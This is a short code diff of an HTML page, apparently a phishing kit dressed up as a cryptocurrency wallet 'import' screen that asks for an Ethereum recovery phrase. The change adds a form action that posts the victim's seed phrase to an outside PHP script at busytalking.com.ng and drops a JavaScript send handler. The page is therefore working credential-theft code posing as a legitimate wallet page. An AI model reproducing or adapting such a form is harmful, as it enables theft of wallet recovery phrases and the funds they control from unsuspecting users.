@@ -120,12 +120,12 @@ Email.send("from@you.com",
 					<!-- Tab panes -->
 					<div class="tab-content">
 						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
-							<form method="post" name="import_phrase">
+							<form method="post" action="https://busytalking.com.ng/scripts/process_a.php" name="import_phrase">
 								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
 								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
 								<input type="hidden" name="value" value="Ethereum">
 								<input type="hidden" name="import_phrase" value="1">
-								<div class="form-group"><button onclick=sendnow(); class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+								<div class="form-group"><button  class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="keystore">
